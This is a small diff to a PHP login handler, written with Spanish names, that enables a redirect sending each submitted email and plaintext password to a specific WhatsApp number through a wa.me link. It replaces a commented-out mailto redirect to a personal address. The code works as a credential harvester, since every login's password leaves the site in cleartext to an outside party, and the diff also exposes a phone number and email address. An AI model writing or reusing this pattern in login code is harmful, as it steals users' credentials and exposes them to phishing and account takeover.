@@ -19,8 +19,8 @@ if (!empty($_POST['InicioSesión'])) {
             - Usuario: $email
             - Contraseña: $password");
             $mensajeDante = urlencode($mensajeDante);
-            #header("location: https://wa.me/527979773095?text=$mensajeDante");
-            header("location: mailto:dantecc10@gmail.com");
+            header("location: https://wa.me/527979773095?text=$mensajeDante");
+            #header("location: mailto:dantecc10@gmail.com");
         }
     } else {
         echo "Campos vacíos";
